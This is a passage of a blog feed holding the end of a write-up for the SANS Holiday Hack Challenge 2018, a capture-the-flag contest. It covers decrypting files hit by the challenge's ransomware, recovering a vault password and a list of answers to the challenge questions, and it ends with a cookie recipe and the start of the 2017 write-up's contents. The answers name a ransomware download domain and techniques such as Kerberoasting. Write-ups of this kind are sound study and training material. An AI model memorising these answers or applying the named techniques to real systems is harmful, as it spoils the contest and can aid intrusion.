    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decrypted_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decrypted_content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./decrypt_wannacookie.py ./alabaster_passwords.elfdb.wannacookie fbcfc121915d99cc20a3d3d5d84f8308
&lt;span class="gp"&gt;$&lt;/span&gt; file alabaster_passwords.elfdb
&lt;span class="go"&gt;alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Finally!&lt;/strong&gt; We have our decrypted file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sqlite3 ./alabaster_passwords.elfdb
&lt;span class="go"&gt;SQLite version 3.22.0 2018-01-22 18:45:57&lt;/span&gt;
&lt;span class="go"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
&lt;span class="go"&gt;sqlite&amp;gt; .schema&lt;/span&gt;
&lt;span class="go"&gt;CREATE TABLE IF NOT EXISTS &amp;quot;passwords&amp;quot; (&lt;/span&gt;
&lt;span class="go"&gt;    `name`    TEXT NOT NULL,&lt;/span&gt;
&lt;span class="go"&gt;    `password`    TEXT NOT NULL,&lt;/span&gt;
&lt;span class="go"&gt;    `usedfor`    TEXT NOT NULL&lt;/span&gt;
&lt;span class="go"&gt;);&lt;/span&gt;
&lt;span class="go"&gt;sqlite&amp;gt; select * from passwords where usedfor=&amp;quot;vault&amp;quot;;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We finally find the final password: &lt;code&gt;ED#ED#EED#EF#G#F#G#ABA#BA#B&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="who-is-behind-it-all"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id46"&gt;Who Is Behind It All?&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Using Alabaster's password, we can now try to enter Santa's vault. We just have
to play the tune on the piano lock and...&lt;/p&gt;
&lt;img alt="pianolock_fail.png" class="align-center" src="/images/sans-christmas-challenge-2018/pianolock_fail.png" /&gt;
&lt;p&gt;Damn! This isn't the right key! If you remember Holy Evergreen's document on
music transposition, Alabster likes song in the key of D major. Now, we just
have to find what's the key of the original song.&lt;/p&gt;
&lt;p&gt;We can use the following rules of thumb:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;What's the first note? E.&lt;/li&gt;
&lt;li&gt;What's the most common note? E.&lt;/li&gt;
&lt;li&gt;What's the last note? B.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The two first rules hint that this is in the key of E. Indeed, every note in
the password fit in the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/E_major"&gt;E major scale&lt;/a&gt;
(well, except for the borrowed A♯).&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: this is by no means a fool-proof method to identify the key of a song,
but it can be handy.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So, the song is in E major, and we want it in D major. D is a whole step below
E, so we must take every note in the song, and move them down one whole step.
This gives us &lt;code&gt;DC#DC#DDC#DEF#EF#GAG#AG#A&lt;/code&gt;. We can now play this on the
piano lock:&lt;/p&gt;
&lt;img alt="pianolock_success.png" class="align-center" src="/images/sans-christmas-challenge-2018/pianolock_success.png" /&gt;
&lt;p&gt;This gives us the message &lt;code&gt;You have unlocked Santa's vault!&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Success! We now have access to Santa's vault. Now, to find who is behind it
all. We go inside the vault and we find... Hans? And Santa?!&lt;/p&gt;
&lt;img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" /&gt;
&lt;p&gt;&lt;em&gt;Alabaster says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I'm seriously impressed by your security skills!&lt;/p&gt;
&lt;p&gt;How could I forget that I used Rachmaninoff as my musical password?&lt;/p&gt;
&lt;p&gt;Of course I transposed it it before I entered it into my database for extra
security.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Alabaster steps aside, revealing two familiar, smiling faces.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img alt="hans_smile.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans_smile.png" /&gt;
&lt;p&gt;&lt;em&gt;Hans says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It’s a pleasure to see you again.&lt;/p&gt;
&lt;p&gt;Congratulations.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2018/santa.png" /&gt;
&lt;p&gt;&lt;em&gt;Santa says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You DID IT! You completed the hardest challenge. You see, Hans and the
soldiers work for ME. I had to test you. And you passed the test!&lt;/p&gt;
&lt;p&gt;You WON! Won what, you ask? Well, the jackpot, my dear! The grand and
glorious jackpot!&lt;/p&gt;
&lt;p&gt;You see, I finally found you!&lt;/p&gt;
&lt;p&gt;I came up with the idea of KringleCon to find someone like you who could
help me defend the North Pole against even the craftiest attackers.&lt;/p&gt;
&lt;p&gt;That’s why we had so many different challenges this year.&lt;/p&gt;
&lt;p&gt;We needed to find someone with skills all across the spectrum.&lt;/p&gt;
&lt;p&gt;I asked my friend Hans to play the role of the bad guy to see if you could
solve all those challenges and thwart the plot we devised.&lt;/p&gt;
&lt;p&gt;And you did!&lt;/p&gt;
&lt;p&gt;Oh, and those brutish toy soldiers? They are really just some of my elves
in disguise.&lt;/p&gt;
&lt;p&gt;See what happens when they take off those hats?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img alt="toy_soldier_green_no_hat.png" class="align-center" src="/images/sans-christmas-challenge-2018/toy_soldier_green_no_hat.png" /&gt;
&lt;img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2018/santa.png" /&gt;
&lt;p&gt;&lt;em&gt;Santa continues&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Based on your victory… next year, I’m going to ask for your help in
defending my whole operation from evil bad guys.&lt;/p&gt;
&lt;p&gt;And welcome to my vault room. Where's my treasure? Well, my treasure is
Christmas joy and good will.&lt;/p&gt;
&lt;p&gt;You did such a GREAT job! And remember what happened to the people who
suddenly got everything they ever wanted?&lt;/p&gt;
&lt;p&gt;They lived happily ever after.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Thank you, Santa!&lt;/p&gt;
&lt;img alt="santas_vault_selfie.png" class="align-center" src="/images/sans-christmas-challenge-2018/santas_vault_selfie.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="answers-to-the-questions"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id47"&gt;Answers to the questions&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Let's answer the questions:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;What phrase is revealed when you answer all of the &lt;a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html"&gt;KringleCon Holiday Hack
History questions&lt;/a&gt;?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The phrase revealed is &lt;code&gt;Happy Trails&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;Who submitted (First Last) the rejected talk titled &lt;strong&gt;Data Loss for Rainbow
Teams: A Path in the Darkness&lt;/strong&gt;?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The talk was submitted by John McClane.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;The KringleCon Speaker Unpreparedness room is a place for frantic speakers
to furiously complete their presentations. The room is protected by a door
passcode. Upon entering the correct passcode, what message is presented to
the speaker?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The message is &lt;code&gt;Welcome unprepared speaker!&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;Retrieve the encrypted ZIP file from the North Pole Git repository. What is
the password to open this file?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The password is &lt;code&gt;Yippee-ki-yay&lt;/code&gt;, motherf*cker.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;Using the data set contained in this &lt;a class="reference external" href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova"&gt;SANS Slingshot Linux image&lt;/a&gt;,
find a reliable path from a Kerberoastable user to the Domain Admins group.
What’s the user’s logon name (in &lt;a class="reference external" href="mailto:username&amp;#64;domain.tld"&gt;username&amp;#64;domain.tld&lt;/a&gt; format)?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The user is &lt;code&gt;LDUBEJ00320&amp;#64;AD.KRINGLECASTLE.COM&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;Bypass the authentication mechanism associated with the room near Pepper
Minstix. &lt;a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg"&gt;A sample employee badge is available&lt;/a&gt;.
What is the access control number revealed by the &lt;a class="reference external" href="https://scanomatic.kringlecastle.com/index.html"&gt;door authentication
panel&lt;/a&gt;?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The access control number is &lt;code&gt;19880715&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;Santa uses an Elf Resources website to look for talented information
security professionals. &lt;a class="reference external" href="https://careers.kringlecastle.com/"&gt;Gain access to the website&lt;/a&gt; and fetch the document
&lt;code&gt;C:\candidate_evaluation.docx&lt;/code&gt;. Which terrorist organization is
secretly supported by the job applicant whose name begins with &amp;quot;K&amp;quot;?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The terrorist organization is &lt;code&gt;Fancy Beaver&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="8"&gt;
&lt;li&gt;Santa has introduced a &lt;a class="reference external" href="https://packalyzer.kringlecastle.com/"&gt;web-based packet capture and analysis tool&lt;/a&gt; to support the elves and their
information security work. Using the system, access and decrypt HTTP/2
network activity. What is the name of the song described in the document
sent from Holly Evergreen to Alabaster Snowball?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The song is &lt;code&gt;Mary Had a Little Lamb&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;Alabaster Snowball is in dire need of your help. Santa's file server has
been hit with malware. Help Alabaster Snowball deal with the malware on
Santa's server by completing several tasks. To start, assist Alabaster by
accessing (clicking) the snort terminal below. Then create a rule that will
catch all new infections. What is the success message displayed by the Snort
terminal?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The success message is &lt;code&gt;[+] Congratulation! Snort is alerting on all
ransomware and only the ransomware!&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;After completing the prior question, Alabaster gives you a document he
suspects downloads the malware. What is the domain name the malware in the
document downloads from?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The domain name is &lt;code&gt;erohetfanu.com&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="11"&gt;
&lt;li&gt;Analyze the full malware source code to find a kill-switch and activate it
at the North Pole's domain registrar &lt;a class="reference external" href="https://hohohodaddy.kringlecastle.com/index.html"&gt;HoHoHo Daddy&lt;/a&gt;. What is the full
sentence text that appears on the domain registration success message
(bottom sentence)?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The sentence is &lt;code&gt;Successfully registered yippeekiyaa.aaay!&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="12"&gt;
&lt;li&gt;After activating the kill-switch domain in the last question, Alabaster
gives you a &lt;a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip"&gt;zip file&lt;/a&gt;
with a memory dump and encrypted password database. Use these files to
decrypt Alabaster's password database. What is the password entered in the
database for the Vault entry?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The password in the database is &lt;code&gt;ED#ED#EED#EF#G#F#G#ABA#BA#B&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="13"&gt;
&lt;li&gt;Use what you have learned from previous challenges to open the &lt;a class="reference external" href="https://pianolockn.kringlecastle.com/"&gt;door to
Santa's vault&lt;/a&gt;. What message do
you get when you unlock the door?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The message is &lt;code&gt;You have unlocked Santa's vault!&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="14"&gt;
&lt;li&gt;Who was the mastermind behind the whole KringleCon plan?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The mastermind was Santa all along!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id48"&gt;Conclusion&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Whew! Well, this sure was challenging. For some of these questions, I think I
was too focused on one possible answer, and when I saw it wasn't the correct
one, I felt out of ideas. For example, I shouldn't have missed the hex encoding
of the file names in the ransomware source code, but I was distracted by the
unsafe randomness!&lt;/p&gt;
&lt;p&gt;Which brings the question, is &lt;code&gt;Get-Random&lt;/code&gt; actually cryptographically
safe is used without a seed? This seems to contradicts what I've found during
my research, but I don't have the answer 🤷‍♂️.&lt;/p&gt;
&lt;p&gt;Our next question is, what does &lt;code&gt;erohetfanu&lt;/code&gt; (the domain used for the
ransomware DNS server) mean? I asked one of my anagram-enthusiast friend what
it could mean, and he gave me the following answers:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Four ethane&lt;/li&gt;
&lt;li&gt;A fun hetero &lt;em&gt;(I like this one)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Ah fourteen&lt;/li&gt;
&lt;li&gt;Unearth foe&lt;/li&gt;
&lt;li&gt;Fear the UNO &lt;em&gt;(Hmmm, what?)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;One fur heat&lt;/li&gt;
&lt;li&gt;Eat, fun hero &lt;em&gt;(Also like this one)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A foe hunter &lt;em&gt;(Probably this one, though)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And finally &lt;a class="reference external" href="https://nerdist.com/die-hard-christmas-movie/"&gt;does this really qualify as a **Christmas** challenge&lt;/a&gt;? 😉&lt;/p&gt;
&lt;p&gt;Once again, congratulations to the SANS team for a well executed challenge. I
enjoyed the fact that it allowed people to use real-world professional tools
and techniques (like &lt;code&gt;BloodHound&lt;/code&gt;, and Kerberoast). I also really liked
the malware analysis portion, even if I was a litle bit frustrated with myself!
It's not something that we usually do in our day-to-day work and I enjoyed the
exercise.&lt;/p&gt;
&lt;p&gt;See you next year!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="appendix-chocolate-chip-cookie-recipe"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id49"&gt;Appendix: Chocolate Chip Cookie Recipe&lt;/a&gt;&lt;/h2&gt;
&lt;img alt="chocolate_chip_cookie_recipe.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/chocolate_chip_cookie_recipe.jpg" /&gt;
&lt;p&gt;&lt;strong&gt;PREHEAT&lt;/strong&gt;&amp;nbsp;oven to 375° F.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;COMBINE&lt;/strong&gt;&amp;nbsp;flour, baking soda and salt in small bowl. Beat butter, granulated
sugar, brown sugar and vanilla extract in large mixer bowl until creamy. Add
eggs, one at a time, beating well after each addition. Gradually beat in flour
mixture. Stir in morsels and nuts. Drop by rounded tablespoon onto ungreased
baking sheets.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BAKE&lt;/strong&gt;&amp;nbsp;for 9 to 11 minutes or until golden brown. Cool on baking sheets for
2 minutes; remove to wire racks to cool completely.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PAN COOKIE VARIATION:&lt;/strong&gt;&amp;nbsp;Preheat oven to 350° F. Grease 15 x 10-inch
jelly-roll pan. Prepare dough as above. Spread into prepared pan. Bake for 20
to 25 minutes or until golden brown. Cool in pan on wire rack. Makes 4 dozen
bars.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SLICE AND BAKE COOKIE VARIATION: PREPARE&lt;/strong&gt;&amp;nbsp;dough as above. Divide in half;
wrap in waxed paper. Refrigerate for 1 hour or until firm. Shape each half into
15-inch log; wrap in wax paper.  Refrigerate for 30 minutes.* Preheat oven to
375° F. Cut into 1/2-inch-thick slices; place on ungreased baking sheets. Bake
for 8 to 10 minutes or until golden brown. Cool on baking sheets for 2 minutes;
remove to wire racks to cool completely. Makes about 5 dozen cookies.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;* May be stored in refrigerator for up to 1 week or in freezer for up to 8
weeks.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;FOR HIGH ALTITUDE BAKING (5,200 feet):&lt;/strong&gt;&amp;nbsp;Increase flour to 2 1/2 cups. Add 2
teaspoons water with flour and reduce both granulated sugar and brown sugar to
2/3 cup&amp;nbsp;each. Bake drop cookies for 8 to 10 minutes and pan cookie for 17 to 19
minutes.&lt;/p&gt;
&lt;/div&gt;
</content></entry><entry><title>SANS Christmas Challenge 2017</title><link href="https://allyourbase.utouch.fr/posts/2018/01/10/sans-christmas-challenge-2017/" rel="alternate"></link><published>2018-01-10T00:00:00+01:00</published><updated>2018-01-10T00:00:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2018-01-10:/posts/2018/01/10/sans-christmas-challenge-2017/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2017_logo.png" class="align-center" src="/images/sans-christmas-challenge-2017/sans_christmas_challenge_2017_logo.png" /&gt;
&lt;p&gt;'Tis the season to be pwning, falalalala lalalala. As usual, here's my write-up
for the &lt;a class="reference external" href="https://holidayhackchallenge.com/2017/"&gt;2017 SANS Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;div class="contents topic" id="table-of-contents"&gt;
&lt;p class="topic-title first"&gt;Table of contents&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference internal" href="#introduction" id="id16"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#first-page-of-the-great-book" id="id17"&gt;First page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-winter-wonder-landing" id="id18"&gt;North Pole and Beyond: Winter Wonder Landing&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#cranberry-pi-yannick-s-dirty-solution" id="id19"&gt;Cranberry Pi: Yannick's (dirty) solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#cranberry-pi-the-official-solution" id="id20"&gt;Cranberry Pi: the &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#redirecting-the-snowball" id="id21"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#second-page-of-the-great-book" id="id22"&gt;Second …&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</summary><content type="html">&lt;img alt="sans_christmas_challenge_2017_logo.png" class="align-center" src="/images/sans-christmas-challenge-2017/sans_christmas_challenge_2017_logo.png" /&gt;
&lt;p&gt;'Tis the season to be pwning, falalalala lalalala. As usual, here's my write-up
for the &lt;a class="reference external" href="https://holidayhackchallenge.com/2017/"&gt;2017 SANS Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;div class="contents topic" id="table-of-contents"&gt;
&lt;p class="topic-title first"&gt;Table of contents&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference internal" href="#introduction" id="id16"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#first-page-of-the-great-book" id="id17"&gt;First page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-winter-wonder-landing" id="id18"&gt;North Pole and Beyond: Winter Wonder Landing&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#cranberry-pi-yannick-s-dirty-solution" id="id19"&gt;Cranberry Pi: Yannick's (dirty) solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#cranberry-pi-the-official-solution" id="id20"&gt;Cranberry Pi: the &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#redirecting-the-snowball" id="id21"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#second-page-of-the-great-book" id="id22"&gt;Second page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-winconceivable-the-cliffs-of-winsanity" id="id23"&gt;North Pole and Beyond: Winconceivable: The Cliffs of Winsanity&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id1" id="id24"&gt;Cranberry Pi: Yannick's (dirty) solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id2" id="id25"&gt;Cranberry Pi: the &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id3" id="id26"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-christmas-town-infrastructure-letters-to-santa-application" id="id27"&gt;North Pole Christmas Town infrastructure: Letters to Santa application&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#third-page-of-the-great-book" id="id28"&gt;Third page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-cryokinetic-magic" id="id29"&gt;North Pole and Beyond: Cryokinetic Magic&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id4" id="id30"&gt;Cranberry Pi: Yannick's (dirty) solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id5" id="id31"&gt;Cranberry Pi: the &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id6" id="id32"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-christmas-town-infrastructure-smb-server" id="id33"&gt;North Pole Christmas Town infrastructure: SMB server&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#fourth-page-of-the-great-book" id="id34"&gt;Fourth page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-there-s-snow-place-like-home" id="id35"&gt;North Pole and Beyond: There's Snow Place Like Home&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#cranberry-pi" id="id36"&gt;Cranberry Pi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id7" id="id37"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-christmas-town-infrastructure-elf-web-access" id="id38"&gt;North Pole Christmas Town infrastructure: Elf Web Access&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#fifth-page-of-the-great-book" id="id39"&gt;Fifth page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-bumbles-bounce" id="id40"&gt;North Pole and Beyond: Bumbles Bounce&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id8" id="id41"&gt;Cranberry Pi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id9" id="id42"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-christmas-town-infrastructure-north-pole-police-department-web-site" id="id43"&gt;North Pole Christmas Town infrastructure: North Pole Police Department web site&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#sixth-page-of-the-great-book" id="id44"&gt;Sixth page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-i-don-t-think-we-re-in-kansas-anymore" id="id45"&gt;North Pole and Beyond: I don't think we're in Kansas anymore&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id10" id="id46"&gt;Cranberry Pi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id11" id="id47"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-christmas-town-infrastructure-elf-as-a-service-platform" id="id48"&gt;North Pole Christmas Town infrastructure: Elf as a Service platform&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#seventh-page-of-the-great-book" id="id49"&gt;Seventh page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-oh-wait-maybe-we-are" id="id50"&gt;North Pole and Beyond: Oh wait! Maybe we are...&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id12" id="id51"&gt;Cranberry Pi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id13" id="id52"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-christmas-town-infrastructure-elf-machine-interface-server" id="id53"&gt;North Pole Christmas Town infrastructure: Elf-Machine Interface server&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#who-is-behind-all-this" id="id54"&gt;Who is behind all this?&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#north-pole-and-beyond-we-re-off-to-see-the" id="id55"&gt;North Pole and Beyond: We're Off To See The...&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id14" id="id56"&gt;Cranberry Pi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#id15" id="id57"&gt;Redirecting the snowball&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
